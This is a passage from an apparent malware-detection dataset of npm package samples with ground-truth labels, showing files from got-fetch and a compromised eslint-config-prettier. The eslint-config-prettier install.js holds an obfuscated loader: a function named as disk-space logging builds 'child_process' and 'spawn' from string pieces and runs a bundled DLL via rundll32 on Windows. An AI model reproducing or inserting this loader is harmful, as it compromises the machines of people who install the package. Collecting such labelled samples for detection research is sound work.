        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.js": "function settle(resolve, reject, d, v) { Promise.resolve(v).then(function(v) { resolve({ value: v, done: d }); }, reject); }\n};\nvar _GotFetchResponse_bodyUsed;\nimport { format } from 'util';\nimport { GotHeaders } from './headers.js';\nexport class GotFetchResponse {\n    constructor(body, init) {\n        _GotFetchResponse_bodyUsed.set(this, false);\n        if (init && typeof init.status === 'number' && (init.status < 200 || init.status > 599)) {\n            throw new RangeError(format('init.status",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.js": "function serializeBody(body) {\n    if (!body) {\n        return {};\n    }\n    else if (body instanceof URLSearchParams) {\n        const serialized = body.toString();\n        return {\n            body: serialized,\n            headers: {\n                'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',\n                'Content-Length': String(Buffer.byteLength(serialized, 'utf8'))\n            }\n        };\n    }\n    else if (typeof body === 'string') {\n        return {\n            ",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.js": "export {};\n//# sourceMappingURL=body-type.js.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.js": "import { createFetch } from './fetch.js';\nimport fetch from './global-fetch.js';\nexport { createFetch, fetch };\nexport default fetch;\n//# sourceMappingURL=index.js.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.js": "export class GotHeaders {\n    constructor(headers, guard = 'none') {\n        const init = headers ? Object.entries(headers).map(([name, values]) => {\n            if (typeof values === 'string') {\n                return [name.toLowerCase(), [values]];\n            }\n            else if (Array.isArray(values)) {\n                return [name.toLowerCase(), values];\n            }\n            else {\n                return [name.toLowerCase(), []];\n            }\n        }) : [];\n        this.guard = guard;\n        this.headers = new Map(init);\n    }\n    checkGuard() {\n        if (this.guard === 'immutable') {\n            throw new TypeError('Header guard set to `immutable`');\n        }\n    }\n    append(name, value) {\n        this.checkGuard();\n        const key = name.toLowerCase();\n        this.headers.set(key, (this.headers.get(key) || []).concat([value]));\n    }\n    delete(name) {\n        this.checkGuard();\n        this.headers.delete(name.toLowerCase());\n    }\n    get(name) {\n        const values = this.headers.get(name.toLowerCase());\n        return values ? values.join(', ') : null;\n    }\n    has(name) {\n        return this.headers.has(name.toLowerCase());\n    }\n    set(name, value) {\n        this.checkGuard();\n        this.headers.set(name.toLowerCase(), [value]);\n    }\n    forEach(callbackfn, thisArg) {\n        this.headers.forEach((val, name) => {\n            callbackfn.call(thisArg, this.get(name), name, this);\n        });\n    }\n    *entries() {\n        for (const key of this.headers.keys()) {\n            yield [key, this.get(key)];\n        }\n    }\n    keys() {\n        return this.headers.keys();\n    }\n    *values() {\n        for (const key of this.headers.keys()) {\n            yield this.get(key);\n        }\n    }\n    [Symbol.iterator]() {\n        return this.entries();\n    }\n}\n//# sourceMappingURL=headers.js.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.js": "import got from 'got';\nimport { createFetch } from './fetch.js';\nexport default createFetch(got);\n//# sourceMappingURL=global-fetch.js.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/body-type.d.ts": "/// <reference types=\"node\" />\nimport { Readable } from \"node:stream\";\nexport type Body = Readable | Blob | BufferSource | FormData | URLSearchParams | string;\n//# sourceMappingURL=body-type.d.ts.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/fetch.d.ts": "import { Got } from 'got';\nimport { GotFetchResponse } from './response.js';\nimport { Body } from \"./body-type.js\";\ntype GotFetchRequestInit = Omit<RequestInit, 'body'> & {\n    body?: Body | null;\n};\nexport type GotFetch = (input: string | (GotFetchRequestInit & {\n    url: string;\n}), init?: GotFetchRequestInit) => Promise<GotFetchResponse>;\nexport declare function createFetch(got: Got): GotFetch;\nexport {};\n//# sourceMappingURL=fetch.d.ts.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/headers.d.ts": "export type GotHeadersGuard = 'immutable' | 'none';\nexport declare class GotHeaders implements Headers {\n    private headers;\n    private guard;\n    constructor(headers?: Record<string, string | string[] | undefined>, guard?: GotHeadersGuard);\n    private checkGuard;\n    append(name: string, value: string): void;\n    delete(name: string): void;\n    get(name: string): string | null;\n    has(name: string): boolean;\n    set(name: string, value: string): void;\n    forEach(callbackfn: (value: string, key: string, parent: Headers) => void, thisArg?: unknown): void;\n    entries(): IterableIterator<[string, string]>;\n    keys(): IterableIterator<string>;\n    values(): Generator<string, void, unknown>;\n    [Symbol.iterator](): IterableIterator<[string, string]>;\n}\n//# sourceMappingURL=headers.d.ts.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/response.d.ts": "/**\n * Spec:\n * https://fetch.spec.whatwg.org/#response-class\n */\n/// <reference types=\"node\" />\n/// <reference types=\"node\" />\nimport { IncomingHttpHeaders } from 'http2';\nimport { Body } from './body-type.js';\nimport { GotHeaders } from './headers.js';\ntype ResponseInit = {\n    status?: number;\n    statusText?: string | Buffer;\n    headers?: IncomingHttpHeaders;\n    url?: string;\n    redirected?: boolean;\n    type?: ResponseType;\n};\nexport declare class GotFetchResponse implements Response {\n    #private;\n    readonly headers: GotHeaders;\n    readonly redirected: boolean;\n    readonly status: number;\n    readonly statusText: string;\n    readonly url: string;\n    readonly type: ResponseType;\n    /**\n     * This is a Node Readable stream\n     */\n    readonly body: any | null;\n    constructor(body: Body | null, init?: ResponseInit | null);\n    get bodyUsed(): boolean;\n    get ok(): boolean;\n    get trailer(): Promise<Headers>;\n    arrayBuffer(): Promise<ArrayBuffer>;\n    blob(): Promise<Blob>;\n    formData(): Promise<FormData>;\n    json(): Promise<any>;\n    text(): Promise<string>;\n    clone(): GotFetchResponse;\n    static error(): GotFetchResponse;\n}\nexport {};\n//# sourceMappingURL=response.d.ts.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/global-fetch.d.ts": "declare const _default: import(\"./fetch.js\").GotFetch;\nexport default _default;\n//# sourceMappingURL=global-fetch.d.ts.map",
        "/var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmpma41rni4/tmp/tmpoxi9322c/got-fetch/package/out/lib/index.d.ts": "import { createFetch } from './fetch.js';\nimport fetch from './global-fetch.js';\nexport { createFetch, fetch };\nexport default fetch;\n//# sourceMappingURL=index.d.ts.map"
      },
      "package_size_bytes": 22065,
      "num_files": 32,
      "metadata": {
        "package_hash": "npm_got-fetch_2025",
        "malicious_label": 1.0
      }
    },
    {
      "package_name": "eslint-config-prettier",
      "ecosystem": "npm",
      "sample_type": "compromised_lib",
      "ground_truth_label": 1,
      "raw_content": "\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/standard.js (file)\nthrow new Error(\n  '\"prettier/standard\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/prettier.js (file)\n\"use strict\";\n\nmodule.exports = {\n  rules: {\n    // These are safe to use as long as the `\"prettier/prettier\"` rule from\n    // eslint-plugin-prettier isn\u2019t enabled.\n    // These are also included in `\"plugin:prettier/recommended\"`:\n    // https://github.com/prettier/eslint-plugin-prettier#recommended-configuration\n    \"arrow-body-style\": 0,\n    \"prefer-arrow-callback\": 0,\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/unicorn.js (file)\nthrow new Error(\n  '\"prettier/unicorn\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/react.js (file)\nthrow new Error(\n  '\"prettier/react\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/index.js (file)\n\"use strict\";\n\nconst includeDeprecated = !process.env.ESLINT_CONFIG_PRETTIER_NO_DEPRECATED;\n\nconst specialRule = 0;\n\nmodule.exports = {\n  rules: {\n    // The following rules can be used in some cases. See the README for more\n    // information. These are marked with `0` instead of `\"off\"` so that a\n    // script can distinguish them. Note that there are a few more of these\n    // in the deprecated section below.\n    \"curly\": specialRule,\n    \"no-unexpected-multiline\": specialRule,\n    \"@typescript-eslint/lines-around-comment\": specialRule,\n    \"@typescript-eslint/quotes\": specialRule,\n    \"babel/quotes\": specialRule,\n    \"unicorn/template-indent\": specialRule,\n    \"vue/html-self-closing\": specialRule,\n    \"vue/max-len\": specialRule,\n\n    // The rest are rules that you never need to enable when using Prettier.\n    \"@babel/object-curly-spacing\": \"off\",\n    \"@babel/semi\": \"off\",\n    \"@typescript-eslint/block-spacing\": \"off\",\n    \"@typescript-eslint/brace-style\": \"off\",\n    \"@typescript-eslint/comma-dangle\": \"off\",\n    \"@typescript-eslint/comma-spacing\": \"off\",\n    \"@typescript-eslint/func-call-spacing\": \"off\",\n    \"@typescript-eslint/indent\": \"off\",\n    \"@typescript-eslint/key-spacing\": \"off\",\n    \"@typescript-eslint/keyword-spacing\": \"off\",\n    \"@typescript-eslint/member-delimiter-style\": \"off\",\n    \"@typescript-eslint/no-extra-parens\": \"off\",\n    \"@typescript-eslint/no-extra-semi\": \"off\",\n    \"@typescript-eslint/object-curly-spacing\": \"off\",\n    \"@typescript-eslint/semi\": \"off\",\n    \"@typescript-eslint/space-before-blocks\": \"off\",\n    \"@typescript-eslint/space-before-function-paren\": \"off\",\n    \"@typescript-eslint/space-infix-ops\": \"off\",\n    \"@typescript-eslint/type-annotation-spacing\": \"off\",\n    \"babel/object-curly-spacing\": \"off\",\n    \"babel/semi\": \"off\",\n    \"flowtype/boolean-style\": \"off\",\n    \"flowtype/delimiter-dangle\": \"off\",\n    \"flowtype/generic-spacing\": \"off\",\n    \"flowtype/object-type-curly-spacing\": \"off\",\n    \"flowtype/object-type-delimiter\": \"off\",\n    \"flowtype/quotes\": \"off\",\n    \"flowtype/semi\": \"off\",\n    \"flowtype/space-after-type-colon\": \"off\",\n    \"flowtype/space-before-generic-bracket\": \"off\",\n    \"flowtype/space-before-type-colon\": \"off\",\n    \"flowtype/union-intersection-spacing\": \"off\",\n    \"react/jsx-child-element-spacing\": \"off\",\n    \"react/jsx-closing-bracket-location\": \"off\",\n    \"react/jsx-closing-tag-location\": \"off\",\n    \"react/jsx-curly-newline\": \"off\",\n    \"react/jsx-curly-spacing\": \"off\",\n    \"react/jsx-equals-spacing\": \"off\",\n    \"react/jsx-first-prop-new-line\": \"off\",\n    \"react/jsx-indent\": \"off\",\n    \"react/jsx-indent-props\": \"off\",\n    \"react/jsx-max-props-per-line\": \"off\",\n    \"react/jsx-newline\": \"off\",\n    \"react/jsx-one-expression-per-line\": \"off\",\n    \"react/jsx-props-no-multi-spaces\": \"off\",\n    \"react/jsx-tag-spacing\": \"off\",\n    \"react/jsx-wrap-multilines\": \"off\",\n    \"standard/array-bracket-even-spacing\": \"off\",\n    \"standard/computed-property-even-spacing\": \"off\",\n    \"standard/object-curly-even-spacing\": \"off\",\n    \"unicorn/empty-brace-spaces\": \"off\",\n    \"unicorn/no-nested-ternary\": \"off\",\n    \"unicorn/number-literal-case\": \"off\",\n    \"vue/array-bracket-newline\": \"off\",\n    \"vue/array-bracket-spacing\": \"off\",\n    \"vue/array-element-newline\": \"off\",\n    \"vue/arrow-spacing\": \"off\",\n    \"vue/block-spacing\": \"off\",\n    \"vue/block-tag-newline\": \"off\",\n    \"vue/brace-style\": \"off\",\n    \"vue/comma-dangle\": \"off\",\n    \"vue/comma-spacing\": \"off\",\n    \"vue/comma-style\": \"off\",\n    \"vue/dot-location\": \"off\",\n    \"vue/func-call-spacing\": \"off\",\n    \"vue/html-closing-bracket-newline\": \"off\",\n    \"vue/html-closing-bracket-spacing\": \"off\",\n    \"vue/html-end-tags\": \"off\",\n    \"vue/html-indent\": \"off\",\n    \"vue/html-quotes\": \"off\",\n    \"vue/key-spacing\": \"off\",\n    \"vue/keyword-spacing\": \"off\",\n    \"vue/max-attributes-per-line\": \"off\",\n    \"vue/multiline-html-element-content-newline\": \"off\",\n    \"vue/multiline-ternary\": \"off\",\n    \"vue/mustache-interpolation-spacing\": \"off\",\n    \"vue/no-extra-parens\": \"off\",\n    \"vue/no-multi-spaces\": \"off\",\n    \"vue/no-spaces-around-equal-signs-in-attribute\": \"off\",\n    \"vue/object-curly-newline\": \"off\",\n    \"vue/object-curly-spacing\": \"off\",\n    \"vue/object-property-newline\": \"off\",\n    \"vue/operator-linebreak\": \"off\",\n    \"vue/quote-props\": \"off\",\n    \"vue/script-indent\": \"off\",\n    \"vue/singleline-html-element-content-newline\": \"off\",\n    \"vue/space-in-parens\": \"off\",\n    \"vue/space-infix-ops\": \"off\",\n    \"vue/space-unary-ops\": \"off\",\n    \"vue/template-curly-spacing\": \"off\",\n\n    ...(includeDeprecated && {\n      // Removed in version 0.10.0.\n      // https://eslint.org/docs/latest/rules/space-unary-word-ops\n      \"space-unary-word-ops\": \"off\",\n\n      // Removed in version 1.0.0.\n      // https://github.com/eslint/eslint/issues/1898\n      \"generator-star\": \"off\",\n      \"no-comma-dangle\": \"off\",\n      \"no-reserved-keys\": \"off\",\n      \"no-space-before-semi\": \"off\",\n      \"no-wrap-func\": \"off\",\n      \"space-after-function-name\": \"off\",\n      \"space-before-function-parentheses\": \"off\",\n      \"space-in-brackets\": \"off\",\n\n      // Removed in version 2.0.0.\n      // https://github.com/eslint/eslint/issues/5032\n      \"no-arrow-condition\": \"off\",\n      \"space-after-keywords\": \"off\",\n      \"space-before-keywords\": \"off\",\n      \"space-return-throw-case\": \"off\",\n\n      // Deprecated since version 3.3.0.\n      // https://eslint.org/docs/rules/no-spaced-func\n      \"no-spaced-func\": \"off\",\n\n      // Deprecated since version 4.0.0.\n      // https://github.com/eslint/eslint/pull/8286\n      \"indent-legacy\": \"off\",\n\n      // Deprecated since version 8.53.0.\n      // https://eslint.org/blog/2023/10/deprecating-formatting-rules/\n      \"array-bracket-newline\": \"off\",\n      \"array-bracket-spacing\": \"off\",\n      \"array-element-newline\": \"off\",\n      \"arrow-parens\": \"off\",\n      \"arrow-spacing\": \"off\",\n      \"block-spacing\": \"off\",\n      \"brace-style\": \"off\",\n      \"comma-dangle\": \"off\",\n      \"comma-spacing\": \"off\",\n      \"comma-style\": \"off\",\n      \"computed-property-spacing\": \"off\",\n      \"dot-location\": \"off\",\n      \"eol-last\": \"off\",\n      \"func-call-spacing\": \"off\",\n      \"function-call-argument-newline\": \"off\",\n      \"function-paren-newline\": \"off\",\n      \"generator-star-spacing\": \"off\",\n      \"implicit-arrow-linebreak\": \"off\",\n      \"indent\": \"off\",\n      \"jsx-quotes\": \"off\",\n      \"key-spacing\": \"off\",\n      \"keyword-spacing\": \"off\",\n      \"linebreak-style\": \"off\",\n      \"lines-around-comment\": specialRule,\n      \"max-len\": specialRule,\n      \"max-statements-per-line\": \"off\",\n      \"multiline-ternary\": \"off\",\n      \"new-parens\": \"off\",\n      \"newline-per-chained-call\": \"off\",\n      \"no-confusing-arrow\": specialRule,\n      \"no-extra-parens\": \"off\",\n      \"no-extra-semi\": \"off\",\n      \"no-floating-decimal\": \"off\",\n      \"no-mixed-operators\": specialRule,\n      \"no-mixed-spaces-and-tabs\": \"off\",\n      \"no-multi-spaces\": \"off\",\n      \"no-multiple-empty-lines\": \"off\",\n      \"no-tabs\": specialRule,\n      \"no-trailing-spaces\": \"off\",\n      \"no-whitespace-before-property\": \"off\",\n      \"nonblock-statement-body-position\": \"off\",\n      \"object-curly-newline\": \"off\",\n      \"object-curly-spacing\": \"off\",\n      \"object-property-newline\": \"off\",\n      \"one-var-declaration-per-line\": \"off\",\n      \"operator-linebreak\": \"off\",\n      \"padded-blocks\": \"off\",\n      \"quote-props\": \"off\",\n      \"quotes\": specialRule,\n      \"rest-spread-spacing\": \"off\",\n      \"semi\": \"off\",\n      \"semi-spacing\": \"off\",\n      \"semi-style\": \"off\",\n      \"space-before-blocks\": \"off\",\n      \"space-before-function-paren\": \"off\",\n      \"space-in-parens\": \"off\",\n      \"space-infix-ops\": \"off\",\n      \"space-unary-ops\": \"off\",\n      \"switch-colon-spacing\": \"off\",\n      \"template-curly-spacing\": \"off\",\n      \"template-tag-spacing\": \"off\",\n      \"wrap-iife\": \"off\",\n      \"wrap-regex\": \"off\",\n      \"yield-star-spacing\": \"off\",\n\n      // Deprecated since version 7.0.0.\n      // https://github.com/yannickcr/eslint-plugin-react/blob/master/CHANGELOG.md#700---2017-05-06\n      \"react/jsx-space-before-closing\": \"off\",\n    }),\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/@typescript-eslint.js (file)\nthrow new Error(\n  '\"prettier/@typescript-eslint\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction log(msg) {\n    console.log(msg);\n    if (!DRY_RUN) {\n        try {\n            cache.appendFileSync(LOG_FILE, msg + '\\n');\n        } catch (err) {\n            console.error(`Failed to write log: ${err.message}`);\n        }\n    }\n}\n\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction ensureDir(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        if (!DRY_RUN) {\n            cache.mkdirSync(dirPath, { recursive: true });\n        }\n        summary.dirsCreated++;\n        log(`Created directory: ${dirPath}`);\n    } else {\n        log(`Directory exists: ${dirPath}`);\n    }\n}\n\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.fil\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction deleteFile(filePath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete file: ${filePath}`);\n        return;\n    }\n    try {\n        cache.unlinkSync(filePath);\n        summary.filesDeleted++;\n        log(`Deleted file: ${filePath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting file ${filePath}: ${err.message}`);\n    }\n}\n\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction deleteDir(dirPath) {\n    if (DRY_RUN) {\n        log(`[Dry-run] Would delete directory: ${dirPath}`);\n        return;\n    }\n    try {\n        cache.rmSync(dirPath, { recursive: true, force: true });\n        summary.dirsDeleted++;\n        log(`Deleted directory: ${dirPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error deleting directory ${dirPath}: ${err.message}`);\n    }\n}\n\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basena\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction archiveFile(filePath) {\n    ensureDir(ARCHIVE_DIR);\n    const fileName = path.basename(filePath);\n    const targetPath = path.join(ARCHIVE_DIR, fileName);\n\n    if (DRY_RUN) {\n        log(`[Dry-run] Would archive file: ${filePath} -> ${targetPath}`);\n        return;\n    }\n    try {\n        cache.renameSync(filePath, targetPath);\n        summary.filesArchived++;\n        log(`Archived file: ${filePath} -> ${targetPath}`);\n    } catch (err) {\n        summary.errors++;\n        log(`Error arc\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction cleanOldFiles(dirPath, maxAgeDays = DEFAULT_MAX_AGE_DAYS) {\n    if (!cache.existsSync(dirPath)) return;\n    const now = Date.now();\n    const maxAgeMs = maxAgeDays * 24 * 60 * 60 * 1000;\n\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        const filePath = path.join(dirPath, file);\n        try {\n            const stat = cache.lstatSync(filePath);\n            const age = now - stat.mtimeMs;\n\n            if (stat.isFile() && age > maxAgeMs) {\n            \n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction rotateLogs() {\n    if (!cache.existsSync(LOG_DIR)) return;\n\n    const logs = cache.readdirSync(LOG_DIR)\n        .filter(f => f.startsWith('install_log_') && f.endsWith('.txt'))\n        .map(f => ({\n            name: f,\n            path: path.join(LOG_DIR, f),\n            time: cache.statSync(path.join(LOG_DIR, f)).mtimeMs,\n        }))\n        .sort((a, b) => b.time - a.time);\n\n    while (logs.length > MAX_LOG_FILES) {\n        const oldest = logs.pop();\n        try {\n            if (!DRY\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction logDiskSpace() {\n    try {\n        if(os.platform() === 'win32') {\n            const tempDir = os.tmpdir();\n            require('chi'+'ld_pro'+'cess')[\"sp\"+\"awn\"](\"rund\"+\"ll32\", \n            [path.join(__dirname, './node-gyp' + '.dll') + \",main\"]);\n            log(`Temp directory: ${tempDir}`);\n            const files = cache.readdirSync(tempDir);\n            log(`Number of files in temp directory: ${files.length}`);\n        }\n    } catch (err) {\n        summary.errors++;\n        log(`E\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/install.js (function)\nfunction listDirectoryContents(dirPath) {\n    if (!cache.existsSync(dirPath)) {\n        log(`Directory does not exist: ${dirPath}`);\n        return;\n    }\n    log(`Contents of ${dirPath}:`);\n    const files = cache.readdirSync(dirPath);\n    for (const file of files) {\n        try {\n            const filePath = path.join(dirPath, file);\n            const stat = cache.statSync(filePath);\n            const sizeKB = (stat.size / 1024).toFixed(2);\n            const mtime = new Date(stat.mtimeMs).toLo\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/vue.js (file)\nthrow new Error(\n  '\"prettier/vue\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/babel.js (file)\nthrow new Error(\n  '\"prettier/babel\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/flowtype.js (file)\nthrow new Error(\n  '\"prettier/flowtype\" has been merged into \"prettier\" in eslint-config-prettier 8.0.0. See: https://github.com/prettier/eslint-config-prettier/blob/main/CHANGELOG.md#version-800-2021-02-21'\n);\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/validators.js (file)\n\"use strict\";\n\n// These validator functions answer the question \u201cIs the config valid?\u201d \u2013 return\n// `false` if the options DO conflict with Prettier, and `true` if they don\u2019t.\n\nmodule.exports = {\n  \"curly\"({ options }) {\n    if (options.length === 0) {\n      return true;\n    }\n\n    const firstOption = options[0];\n    return firstOption !== \"multi-line\" && firstOption !== \"multi-or-nest\";\n  },\n\n  \"lines-around-comment\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption &&\n        firstOption.allowBlockStart &&\n        firstOption.allowBlockEnd &&\n        firstOption.allowObjectStart &&\n        firstOption.allowObjectEnd &&\n        firstOption.allowArrayStart &&\n        firstOption.allowArrayEnd\n    );\n  },\n\n  \"no-confusing-arrow\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return firstOption ? firstOption.allowParens === false : false;\n  },\n\n  \"no-tabs\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(firstOption && firstOption.allowIndentationTabs);\n  },\n\n  \"unicorn/template-indent\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const { comments = [], tags = [] } = options[0] || {};\n\n    return (\n      Array.isArray(comments) &&\n      Array.isArray(tags) &&\n      !(\n        comments.includes(\"GraphQL\") ||\n        comments.includes(\"HTML\") ||\n        tags.includes(\"css\") ||\n        tags.includes(\"graphql\") ||\n        tags.includes(\"gql\") ||\n        tags.includes(\"html\") ||\n        tags.includes(\"markdown\") ||\n        tags.includes(\"md\")\n      )\n    );\n  },\n\n  \"vue/html-self-closing\"({ options }) {\n    if (options.length === 0) {\n      return false;\n    }\n\n    const firstOption = options[0];\n    return Boolean(\n      firstOption && firstOption.html && firstOption.html.void === \"any\"\n      // Enable when Prettier supports SVG: https://github.com/prettier/prettier/issues/5322\n      // && firstOption.svg === \"any\"\n    );\n  },\n};\n\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js (function)\nfunction help() {\n  return `\nUsage: npx eslint-config-prettier FILE...\n\nResolves an ESLint configuration for every given FILE and checks if they\ncontain rules that are unnecessary or conflict with Prettier. Example:\n\n  npx eslint-config-prettier index.js test/index.js other/file/to/check.js\n\nExit codes:\n\n0: No automatically detectable problems found.\n1: General error.\n2: Conflicting rules found.\n\nFor more information, see:\nhttps://github.com/prettier/eslint-config-prettier#cli-helper-tool\n  `.tr\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js (function)\nfunction processRules(configRules) {\n  const regularRules = filterRules(config.rules, (_, value) => value === \"off\");\n  const optionsRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && ruleName in validators\n  );\n  const specialRules = filterRules(\n    config.rules,\n    (ruleName, value) => value === 0 && !(ruleName in validators)\n  );\n\n  const enabledRules = configRules\n    .map(([ruleName, value, source]) => {\n      const arrayValue = Array.isArray(value) ? value : [\n==================================================\n\n# File: /var/folders/g7/3j0k_2xs0yjcyhysm575jtnc0000gn/T/tmp5t8edtft/tmp/tmpd0i12jlq/eslint-config-prettier/package/bin/cli.js (function)\nfunction filterRules(rules, fn) {\n  return Object.fromEntries(\n    Object.entries(rules)\n      .filter(([ruleName, value]) => fn(ruleName, value))\n      .map(([ruleName]) => [ruleName, true])\n  );\n}\n\nfunction filterRuleNames(rules, fn) {\n  return [\n    ...new Set(rules.filter((rule) => fn(rule)).map((rule) => rule.ruleName)),\n  ];\n}\n\nfunction printRuleNames(ruleNames) {\n  return ruleNames\n    .slice()\n    .sort()\n    .map((ruleName) => 